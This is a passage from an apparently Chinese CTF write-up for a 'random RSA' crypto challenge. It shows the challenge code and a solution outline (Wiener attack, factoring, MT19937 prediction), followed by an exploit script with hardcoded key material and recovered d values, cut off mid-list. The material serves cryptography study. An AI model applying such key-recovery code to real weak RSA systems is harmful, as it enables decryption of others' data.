</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=o>:</span><span class=err>\</span><span class=o>/:</span>  <span class=o>|</span>  <span class=o>:</span><span class=err>\</span><span class=o>/:</span>  <span class=o>|</span>  <span class=p>()()</span>  <span class=o>|</span>  <span class=p>(</span><span class=n>__</span><span class=p>)</span>  <span class=o>|</span>  <span class=o>:</span><span class=err>\</span><span class=o>/:</span>  <span class=o>|</span>  <span class=p>(</span><span class=n>__</span><span class=p>)</span>  <span class=o>|</span>  <span class=o>:</span><span class=err>\</span><span class=o>/:</span>  <span class=o>|</span>  <span class=p>()()</span>  <span class=o>|</span>  <span class=o>:</span><span class=err>\</span><span class=o>/:</span>  <span class=o>|</span>  <span class=o>:</span><span class=err>\</span><span class=o>/:</span>  <span class=o>|</span>  <span class=o>:</span><span class=err>\</span><span class=o>/:</span>  <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>n</span> <span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>e</span> <span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>p</span> <span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>c</span> <span class=o>|</span> <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>t</span>  <span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>f</span> <span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>h</span> <span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>a</span> <span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>p</span> <span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>p</span> <span class=o>|</span>  <span class=err>&#39;</span><span class=o>--</span><span class=err>&#39;</span><span class=n>y</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=err>`</span><span class=o>--------</span><span class=err>`</span><span class=o>--------</span><span class=err>`</span><span class=o>--------</span><span class=err>`</span><span class=o>--------</span><span class=err>&#39;</span><span class=o>--------</span><span class=err>`</span><span class=o>--------</span><span class=err>`</span><span class=o>--------</span><span class=err>`</span><span class=o>--------</span><span class=err>`</span><span class=o>--------</span><span class=err>`</span><span class=o>--------</span><span class=err>`</span><span class=o>--------</span><span class=err>`</span>
</span></span><span class=line><span class=cl><span class=s>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>def</span> <span class=nf>generate_prime</span><span class=p>(</span><span class=nl>bits</span><span class=p>:</span> <span class=kt>int</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=p>(</span><span class=n>getrandbits</span><span class=p>(</span><span class=n>bits</span> <span class=o>-</span> <span class=mi>32</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>next_prime</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>def</span> <span class=n>generate_private_key</span><span class=p>(</span><span class=nl>bits</span><span class=p>:</span> <span class=kt>int</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>,</span> <span class=n>q</span> <span class=o>=</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>bits</span><span class=p>),</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span><span class=p>,</span> <span class=n>phi</span> <span class=o>=</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span><span class=p>,</span> <span class=n>lcm</span><span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=mh>0x10001</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>privateKey</span> <span class=o>=</span> <span class=n>RSA</span><span class=p>.</span><span class=n>construct</span><span class=p>((</span><span class=kt>int</span><span class=p>(</span><span class=n>n</span><span class=p>),</span> <span class=kt>int</span><span class=p>(</span><span class=mh>0x10001</span><span class=p>),</span> <span class=kt>int</span><span class=p>(</span><span class=n>d</span><span class=p>),</span> <span class=kt>int</span><span class=p>(</span><span class=n>p</span><span class=p>),</span> <span class=kt>int</span><span class=p>(</span><span class=n>q</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>privateKey</span><span class=p>,</span> <span class=n>p</span> <span class=o>&gt;</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>__name__</span> <span class=o>==</span> <span class=s>&#34;__main__&#34;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>print</span><span class=p>(</span><span class=n>BANNER</span><span class=p>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>print</span><span class=p>(</span><span class=s>&#34;Welcome to the world of random RSA.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>print</span><span class=p>(</span><span class=s>&#34;Please make your choice.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=n>in</span> <span class=n>range</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=n>choice</span> <span class=o>=</span> <span class=n>input</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>choice</span> <span class=o>==</span> <span class=sc>&#39;1&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=p>,</span> <span class=n>q</span> <span class=o>=</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>global_bits</span><span class=p>),</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>global_bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>N</span> <span class=o>=</span> <span class=n>p</span><span class=o>*</span><span class=n>q</span>
</span></span><span class=line><span class=cl>            <span class=n>d</span> <span class=o>=</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>global_bits</span><span class=o>-</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>e</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=p>(</span><span class=n>p</span> <span class=o>*</span> <span class=n>p</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>q</span> <span class=o>*</span> <span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>print</span><span class=p>(</span><span class=n>f</span><span class=s>&#34;</span><span class=p>{</span><span class=kt>int</span><span class=p>(</span><span class=n>N</span><span class=p>)}</span><span class=s>&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>print</span><span class=p>(</span><span class=n>f</span><span class=s>&#34;{int(e)}&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>elif</span> <span class=n>choice</span> <span class=o>==</span> <span class=sc>&#39;2&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=n>privateKey</span><span class=p>,</span> <span class=n>signal</span> <span class=o>=</span> <span class=n>generate_private_key</span><span class=p>(</span><span class=n>global_bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>Cipher</span> <span class=o>=</span> <span class=n>PKCS1_v1_5</span><span class=p>.</span><span class=n>new</span><span class=p>(</span><span class=n>privateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>c</span> <span class=o>=</span> <span class=p>(</span><span class=n>Cipher</span><span class=p>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>flag</span><span class=p>.</span><span class=n>encode</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>            <span class=n>print</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></div><p>七次获取随机数，最后一次推算密钥</p><p>大致过程：</p><ul><li>根据N和e，通过维纳攻击得到d <a href=https://blog.csdn.net/rreally/article/details/111092579 target=_blank rel="noopener noreffer">RSA之初学维纳攻击</a></li><li>求解p和q</li><li>随机数预测 <a href=https://www.anquanke.com/post/id/205861 target=_blank rel="noopener noreffer">浅析MT19937伪随机数生成算法</a></li></ul><p>exp.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>getrandbits</span><span class=p>,</span> <span class=n>random</span><span class=p>,</span> <span class=n>randint</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=n>iroot</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=n>mpz</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_v1_5</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=n>next_prime</span><span class=p>,</span> <span class=n>lcm</span><span class=p>,</span><span class=n>invert</span> <span class=k>as</span> <span class=n>inverse_mod</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># # 读取数据N和e</span>
</span></span><span class=line><span class=cl><span class=c1># f = open(&#34;out.txt&#34;, &#39;r&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1># N = []</span>
</span></span><span class=line><span class=cl><span class=c1># e = []</span>
</span></span><span class=line><span class=cl><span class=c1># for i in range(7):</span>
</span></span><span class=line><span class=cl><span class=c1>#     m = f.readline()</span>
</span></span><span class=line><span class=cl><span class=c1>#     N.append(int(f.readline().replace(&#34;\n&#34;, &#34;&#34;)))</span>
</span></span><span class=line><span class=cl><span class=c1>#     e.append(int(f.readline().replace(&#34;\n&#34;, &#34;&#34;)))</span>
</span></span><span class=line><span class=cl><span class=c1># print(e)</span>
</span></span><span class=line><span class=cl><span class=n>N</span> <span class=o>=</span> <span class=p>[</span><span class=mi>8797850762527448875711677767020267414950188153161304084832876668598086772233001561698918976784198342454554370940536047153212058794719542235625702687239362849126656874613990149193027279522559247596044678069008014435677475356364279484123571294022908697098941170235127058367562338748488152059184472259418794252127225198563128216677436454484246418206072739139464389798954591627279495270943383687656061640920843925976494700048887628779474283120534608746835005809897804260602471855367836336558301185160294854135318364202761719337662694069575022227399011478465555447473115023808273657946585434738210801514112060541284618393</span><span class=p>,</span> <span class=mi>10038439328181348277455376467824354954092573882426151141413010377935088118248334225905897871893410903258360225230186354132414689730237736924323403850797854534196155066596954336349645941857585605029735333030656580826182968475277511326440697448684839256713338670071756666705870440203910254473991369982237307785670836921669526890638021720024676256403514863114716472640202063867975152349450004347656749345903039090677717514662565028996759129809848139167705867507560491909270111034295630845341493786394061996074503472573030720785526248385734678032443825555698508122190171658483226673657040375975913880265811726205581059147</span><span class=p>,</span> <span class=mi>1927717471208759784994824041051582230285824484249123307165742473095185634713586535003830852335176965184386710385562759323709775335469724535832689168066861014719806445429368420906215143001648669424021939394585195369577216586646974432921629249276801190041858750488211518111672335500984308108372911812604599314510113847284306529342176426231451190164423327992686552687624612785966465596658798589703138279611061196359484562989006254489198582022257304668601970724969697945415472873587313500432934295345792258082847922276049009252421100376445943978456691305648027495987925481164069131879795025036074314824080003312457626541</span><span class=p>,</span> <span class=mi>77528653010284944983696081129067425839140309986300316765964408728526434629194332889049508842668263520473119399947063754621917723368866836802964734677919990757548756828494241227024344360245774768430371076149240674076124069421527957053142413370170426513760255352632380829325880745506562735329295881347171568748072169712010233129767545195275031344677817912598184314754427455637960587708232949731957945082323286859546575185434793007756410138119769831057792868059988501680866850271048110737346487210790967354667127128163245804131977137826515620459008706886421596272650087798133720704429500971272712245819582498249917779</span><span class=p>,</span> <span class=mi>2350749000945474111771131272006142945937437914121343317392611216100449280603980220005546372842695219101643592303785853532996478871838367757280398826361078223551970655120721081435113179927784245890117948349648588719646353084466139662472124442550742651101926683153717710564984357185797006677743963825643214784245707329653934546400618351498799090854992974797915167843907532159843185110794692136199558948233920558118510431931949956741076598663602259337864799037984119317985930119377574473628788025987216183973600709590867072284442474326604924465833514487234200101509454736967874832805658212436454421889149721245453921251</span><span class=p>,</span> <span class=mi>151000475828984871482027881657426912566037572815843613830290016027923367400425007808751226463646142964579163707358633174141751351761506530603152122212762893522585294755880564810340472764446524331822936874711406613318174179472063694866863130911712751029337877462234777338959728843227811303408378168785463393311453817130255547631483417924229275619705461218660487733745964148126409272641379303389084493234638305952774080836962120630987548740554725255727643781832012856406460932860982554520127633864424747106724613425692690669849923057605364409738425120645220390740037330293061493121412885983352648940113898346704551763</span><span class=p>,</span> <span class=mi>4072789635992221252366753400265152968540279404582695918451633867043496422987383092699056499784164636204563724068328308288705786294177474592905219504528941804243951601112084910666731729049061114272989490424225615830375098398888910884560960473989494659591978243388159102650214597626193695615606567303387287051860164158926141785160284740574787914291616972032614250846206805467296137330863436513375965857955714517694843653116092611590944281647783344756663361217459866592015398792139458361241521587926600079403420336766872141446963378166804440306858722755858647468601759949168697941377293823756852700905579489613941330401</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=p>[</span><span class=mi>62135925531854349567541464457157510728999659445506359025835425178816308644513438958429620739677673531082813353602902380560532233729953186730709456262150426081411797050337785515252267859994661614380129416594166988429499491110286964173737672395699909630434305769212257854290848331856450625430865714262548926660538453951138235656040703347629977073338203431858042040648187430431553967464702448547417458012391891191242331168827516542879948925736627632321095493822141798261029795563020960949440470852487726454983604777024946653516688511628581094434070313161148363091864801587932130131222114058756663737018594845029100610870100981772922719932501897107986436384553924580696054983243999525735543904677932683557787094544920092902344245490851999001894403739443192767809108853176149674625902251491507418698600952398971432916945719740607356567766352811446399855242480803916096308801281366905201081653539982742300310493108147163668074975472416965463427143017353722938673374387413701688276314458709813152037581386235583019330128990622735228949931913797416544873823740346398308931434255971685778245882836209417673306780178675125718872280898768175088575983734438147485798271689105310514589999041150590116285761955078022709524743869882636169444321451</span><span class=p>,</span> <span class=mi>39414431128629466612542783047207307661146037253252693778084704835563691951987399462193887798952870397356781323847460459312164758655683681738787926835537631873138305869527698547574947711455124813421455989240957754634645720616269034126093419601306450852464963622649559013956802363490229757584005193937037071164579022207131275670150921336315659703806725732382794565483978900790263438437828257370595900953232622649348171883808867689956958813930578956664016908271995727289990684314995994570036235761669651592169757027900025256547476177230487911191715670886289192827726151618713226245451107810559025294299357562992225087725292827167194739152233488584551196607812117898769846142546819881769958585254151983425925548068059563690474920703404149816847969793224781731964076774477161461706741173300206355026167844460918864925466658113993600185030587581034136656975322179705250574890772370721670114550477296094578693235068914701461400542318462832969736258143099677105110857780040373778332957999518631818600626464368717872068093170517836714076864359732464540748251643649829617097042699134775752231535023324501498197546626180849412392627171681819967078820884787528516753552724789535531683019313067232546488548638281612111163083526085836810238150043</span><span class=p>,</span> <span class=mi>420353037025161238627553075133440132436425858208542519994676369442148377940113272918619400610751758234806111516301807990401494023870572919989508451002211560487147032049182587287495292288855983145713206187147329153825641904312914011319543324632863336738715542555376426923960180146487149086822405922078334334568729330002944972414244326267867091935048856515835877412536651371380854800538495297708158753520839232494874080532110069400718595794670816016565023629475180223160000502830531156797138453424701815454206837667871595212766400608761683966578587336783730111922790675537326071401529291365698144801070632841654623311961955001654471507984494941657265023603127102609263334415722800853721463148884180952161280913153182307403993317034498255741266152491737218314660200234017447635791002746856371928509727258260246508024734824765882257996821551098375095705955303156016794538187843666372567979988665758269259530704014615418026266006205660753958401008803714864882696575562711931524113806960702091928100131812328387178933476733136736196836167097040433737018842436409913490812832751703137945318590834175685900721641585552819311658299431507626598826518600223943967941757277208955339125380321457297908243985945990297282835934414777823161858103</span><span class=p>,</span> <span class=mi>96340856679521099680399381029285179373079341679890011855277803652410835369151902332831429860242329413921764788586201449170382183573644159151551478412563870295499238279232279844610996295623469233820994472906790180496154595262692398602202483199590814031625838488577611239983249989666159373583107121905408361690416973743768332464716212553415964090325335528651151212525587260268165692216736961468559066053565892217550089424810922535811310214416819173662437182522622287096978422876290851805653794238785766757740685556802723262327161771062312156798943184828082950879718234494740654604152654464074125837193142410747887176873650619270693570605695099625047742526144509153080820585643921173029394324617819607229088329801521744790378100064566003426952397341343558942880949627331327766257007084974732077363361442518115663644798073648941752482204337720022589312577874870773990109706313893233256092220250934767448387202369643107116348202053318650954262682017256870296625197151766813972951668385527071712068349242237629323573707225466578548762022142434227043986402301857035096780573199918594229754109832268705097475677929764667386158831687725638122311068505600716030792458083668066993518088446866221294986491412592730004389294906672622183547</span><span class=p>,</span> <span class=mi>2468577620953873788831301886089732289671675986323897848817680564975055516269667766838306997392041231845422049867402739476014962069389096568229267981501104119024628355529213410317728822273542676430337737581353212981459681938776579283800790598573813490647107204475212005165345029173827642534941526304691240488227637053542036768326691356551176269569775484999090387047322379852738377540278407648791446696678962859863883369218448933835838513137455503802160284307201429751024623347745843745649213709158043869084250379419262909625727553852956363221679012545875673258317922164328455039502577153146989020461918686714863982389170878644762730468375521477035878326083478978457157148796997465883729534134790906748083898789113790407760341337685796401764503315947952761324202388820903777548109697530056623611650711865107243387141480272765274408556930619769255573190323292202826704385565025428843945703669206395180207488291114830066729430744854393996980092506012847640260310065973590900121111188217230959853169230905238403776637167749134174426788440317946541672921949812998948109929052203525458230445050661715498493352562324232095397366296104959046311729535190826961139768772690614833051826261321903268611834162277141660976924251204561845724179797</span><span class=p>,</span> <span class=mi>5367249678645601484289376822398140663314438035616977869856902375172612740642935698411214150025231255844807871325353829481462763208560474075268191227227584141763502847034513686303184123045192320602272205101537386071307134972120483711923610334468381440810547515532515987247236401204370119624199729475148766978652504362431472612800274334605786612399927595630338424415112189378940802168094731019330192200574163309289570460484957871038119408484334255600974642835499936507096013010976598116556674095735771768427600454402319704414499228893519937442969620484803429104583269202462619326651219334619668199748933138915420645199894078128684432198102673190859257963791486000025728236495613041962284409724660193190372838472329076622569127629159825412656392864725218802889627809249364771234405745331961391232582811123447001795946387415127852409189879601626146640886152279698578315457861191319436481094761970909341581600235516092455199890562681639829311988633033672845441211808875984107653262617718830656712989232189491775173402607414221367784258835590997400751126438897564500400751157261566562648860114240527201633745200721874217416072260946740421063453551795867288566341490594720306576974363545794545617509969132306750842622475796103064679083</span><span class=p>,</span> <span class=mi>5934462997721628180078696655020214149233349289345124710841392757700042849007506426399706581457286434045720680762166139244254769056060272832638703809959098428029410511312621297095151145505860598508141799271082110941698332764019271062731155251065863327914800485131282731040001224593739523218625419220092108708953522533869491057061517920809277207908173800999668995050639302454758577979073415245535642853002183175598142716630517533145210629341612896376551129858098699542916281031058481581401616559261894995390731858809051377365893989542761917479376641124844047586047125148885256007282201944893865162893229638328305782645927798942857930712482157354886872219088027582528622886757816178255087194649069066699996604032815429772751598384104395422804420582648787830187205611197494163262735541500452091469510308025515327752878191449917437920651754771538114011125514021061301802434122284802937853925509268983017565735655221555727157361211948652555729970995359913510882666071639006719468746290516614587445384652180147034451140381399679846553491473329440309184598856422454781492649384908752445203783265807020592361440851158124884373554275342169235580137958729176000558422635692805449376084384493834774458569298304777840414145040528746630299465423</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x02\x00\x03</span><span class=s2>5</span><span class=se>\x06\xe2\xb2\x7f\xe5\t\xdf\\\xb9\xb8\xa8\xac</span><span class=s2>]</span><span class=se>\xef\xde</span><span class=s2>Gz2E</span><span class=se>\xdb\xf0\xf0</span><span class=s2>d</span><span class=se>\xaa\xe3\x90</span><span class=s2>u</span><span class=se>\xe3</span><span class=s2>-K</span><span class=se>\x06</span><span class=s2>Q</span><span class=se>\x89</span><span class=s2>4</span><span class=se>\xa2\xd8</span><span class=s2>1&#39;</span><span class=se>\xac\xbc\xfc</span><span class=s2>i</span><span class=se>\xb7</span><span class=s2>vX</span><span class=se>\x1c\xfc\xe6\xc7\xc8\xf2</span><span class=s2>vj</span><span class=se>\xff</span><span class=s2>c</span><span class=se>\xd4</span><span class=s2>A</span><span class=se>\x98\xf4</span><span class=s2>s</span><span class=se>\xc6\xe6</span><span class=s2>&amp;mlmx</span><span class=se>\xa1\xdb\xe1\xb0</span><span class=s2>B</span><span class=se>\xee</span><span class=s2>o</span><span class=se>\xf0</span><span class=s2>8</span><span class=se>\xa2</span><span class=s2>x</span><span class=se>\xf5\x8c\x02</span><span class=s2>F</span><span class=se>\xbb</span><span class=s2>HGh</span><span class=se>\x14\x1d\xab\x1a\x97\x93\xa2\xd6</span><span class=s2>N</span><span class=se>\x1d\x1d\xe8</span><span class=s2>*</span><span class=se>\x9f\xe4\\</span><span class=s2>B</span><span class=se>\x0b</span><span class=s2>;</span><span class=se>\x03\xef\xa3</span><span class=s2>h</span><span class=se>\x05\x06\xec\xf6</span><span class=s2>v</span><span class=se>\xde\xb8\xd0\xef\xda\x1a\xbd\xee\x81</span><span class=s2>Y</span><span class=se>\xc7</span><span class=s2> </span><span class=se>\xd6\xc3\xae\xe1\xcb</span><span class=s2>-</span><span class=se>\x02\xbf</span><span class=s2>c~n</span><span class=se>\xf9</span><span class=s2>j</span><span class=se>\x8d\xdd</span><span class=s2>k;~</span><span class=se>\x90\x17\xd8</span><span class=s2>2</span><span class=se>\xbe\x98</span><span class=s2>T</span><span class=se>\x0c</span><span class=s2>O/</span><span class=se>\xec</span><span class=s2>w</span><span class=se>\x85</span><span class=s2>e</span><span class=se>\x1d</span><span class=s2>+</span><span class=se>\xfc\x0e</span><span class=s2>mu-S</span><span class=se>\xd4\xc9</span><span class=s2>21</span><span class=se>\xac</span><span class=s2>w</span><span class=se>\xe4</span><span class=s2>V</span><span class=se>\xdd\xce\x87</span><span class=s2>9</span><span class=se>\x1d\xfc\x87</span><span class=s2>_`{l</span><span class=se>\x88</span><span class=s2>X</span><span class=se>\xbf</span><span class=s2>C</span><span class=se>\n\xf2\xec</span><span class=s2>w</span><span class=se>\xb6\xd9\xb3\x0b</span><span class=s2>$</span><span class=se>\x88</span><span class=s2>c_vX</span><span class=se>\x13\x93</span><span class=s2>{&#39;</span><span class=se>\xea\x96</span><span class=s2>g</span><span class=se>\xa4</span><span class=s2>{</span><span class=se>\x08\x03\xe0</span><span class=s2>=g</span><span class=se>\xb6\xf9</span><span class=s2>c}</span><span class=se>\x1f</span><span class=s2>9</span><span class=se>\xe2\t\x13\x13</span><span class=s2>@M</span><span class=se>\xea\xc9</span><span class=s2>_</span><span class=se>\xea</span><span class=s2>M</span><span class=se>\x94\xaf\xde\xdd\xd5</span><span class=s2>4</span><span class=se>\xd2\xfc\x07\xf1\xd1</span><span class=s2>@</span><span class=se>\xb7\xe1\x9b</span><span class=s2>}</span><span class=se>\xe0\xb7</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># # 维纳攻击求出d</span>
</span></span><span class=line><span class=cl><span class=c1># def transform(x, y):  # 使用辗转相处将分数 x/y 转为连分数的形式</span>
</span></span><span class=line><span class=cl><span class=c1>#     res = []</span>
</span></span><span class=line><span class=cl><span class=c1>#     while y:</span>
</span></span><span class=line><span class=cl><span class=c1>#         res.append(x // y)</span>
</span></span><span class=line><span class=cl><span class=c1>#         x, y = y, x % y</span>
</span></span><span class=line><span class=cl><span class=c1>#     return res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># def continued_fraction(sub_res):</span>
</span></span><span class=line><span class=cl><span class=c1>#     numerator, denominator = 1, 0</span>
</span></span><span class=line><span class=cl><span class=c1>#     for i in sub_res[::-1]:  # 从sublist的后面往前循环</span>
</span></span><span class=line><span class=cl><span class=c1>#         denominator, numerator = numerator, i * numerator + denominator</span>
</span></span><span class=line><span class=cl><span class=c1>#     return denominator, numerator  # 得到渐进分数的分母和分子，并返回</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># # 求解每个渐进分数</span>
</span></span><span class=line><span class=cl><span class=c1># def sub_fraction(x, y):</span>
</span></span><span class=line><span class=cl><span class=c1>#     res = transform(x, y)</span>
</span></span><span class=line><span class=cl><span class=c1>#     res = list(map(continued_fraction, (res[0:i] for i in range(1, len(res)))))  # 将连分数的结果逐一截取以求渐进分数</span>
</span></span><span class=line><span class=cl><span class=c1>#     return res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># def get_pq(a, b, c):  # 由p+q和pq的值通过维达定理来求解p和q</span>
</span></span><span class=line><span class=cl><span class=c1>#     par = gmpy2.isqrt(b * b - 4 * a * c)  # 由上述可得，开根号一定是整数，因为有解</span>
</span></span><span class=line><span class=cl><span class=c1>#     x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a)</span>
</span></span><span class=line><span class=cl><span class=c1>#     return x1, x2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># def wienerAttack(e, n):</span>
</span></span><span class=line><span class=cl><span class=c1>#     for (d, k) in sub_fraction(e, n):  # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span>
</span></span><span class=line><span class=cl><span class=c1>#         if k == 0:  # 可能会出现连分数的第一个为0的情况，排除</span>
</span></span><span class=line><span class=cl><span class=c1>#             continue</span>
</span></span><span class=line><span class=cl><span class=c1>#         if (e * d - 1) % k != 0:  # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span>
</span></span><span class=line><span class=cl><span class=c1>#             continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#         phi = (e * d - 1) // k  # 这个结果就是 φ(n)</span>
</span></span><span class=line><span class=cl><span class=c1>#         px, qy = get_pq(1, n - phi + 1, n)</span>
</span></span><span class=line><span class=cl><span class=c1>#         if px * qy == n:</span>
</span></span><span class=line><span class=cl><span class=c1>#             p, q = abs(int(px)), abs(int(qy))  # 可能会得到两个负数，负负得正未尝不会出现</span>
</span></span><span class=line><span class=cl><span class=c1>#             d = gmpy2.invert(e, (p - 1) * (q - 1))  # 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span>
</span></span><span class=line><span class=cl><span class=c1>#             return d</span>
</span></span><span class=line><span class=cl><span class=c1>#     print(&#34;该方法不适用&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># d = []</span>
</span></span><span class=line><span class=cl><span class=c1># for i in range(7):</span>
</span></span><span class=line><span class=cl><span class=c1>#     n1 = N[i]</span>
</span></span><span class=line><span class=cl><span class=c1>#     e1 = e[i]</span>
</span></span><span class=line><span class=cl><span class=c1>#     d1 = wienerAttack(e1, n1*n1)</span>
</span></span><span class=line><span class=cl><span class=c1>#     d.append(d1)</span>
</span></span><span class=line><span class=cl><span class=c1># print(d)</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=p>[</span><span class=n>mpz</span><span class=p>(</span><span class=mi>12478636754262584875714402813785935381703692034913368819662747926381983287030454860415821658582608015076476113522362203650457532280846698731443065733467164912590756042915952284152369671704483745169572916093710865957709352142970714537141923618160571870998317365146678024652338760379593840547147546691</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>23686274071756584281281807563388086490643341994627149883819049467156195938414765352685066006835491596086155149501479259930870219968366990760665504269584648197358306029658434541125578409986601900517646756401965391345776379531925704073937713514857856456779922155673360092385649884061061994435393356947</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>31781082783636099987448338768370700891304625270941924798677820291433268614382757840484197434880685854455913743145213514234116891556561320107838875875619847165814531052668523923579930102602387423618169169761409663775487386896068927652232173720658940475678459596255896536354911497161221799501839204487</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span 